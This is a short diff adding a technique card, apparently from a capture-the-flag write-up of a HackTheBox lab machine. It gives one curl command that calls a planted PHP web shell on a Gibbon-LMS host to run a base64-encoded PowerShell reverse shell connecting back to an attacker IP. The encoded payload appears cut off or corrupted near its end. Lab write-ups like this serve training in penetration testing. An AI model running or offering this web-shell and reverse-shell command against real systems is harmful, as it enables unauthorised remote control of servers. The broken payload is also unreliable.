@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you establish a reverse shell using the web shell?
+
+CONTEXT:
+You want to transfer a reverse shell script to the server.
+
+METHOD / ANSWER:
+Command: `curl 'http://frizzdc.frizz.htb/Gibbon-LMS/0xdf.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAHIAZQBetgA=')`
+Explanation: This command sets up a reverse shell back to your machine using PowerShell, providing you a command line interface.
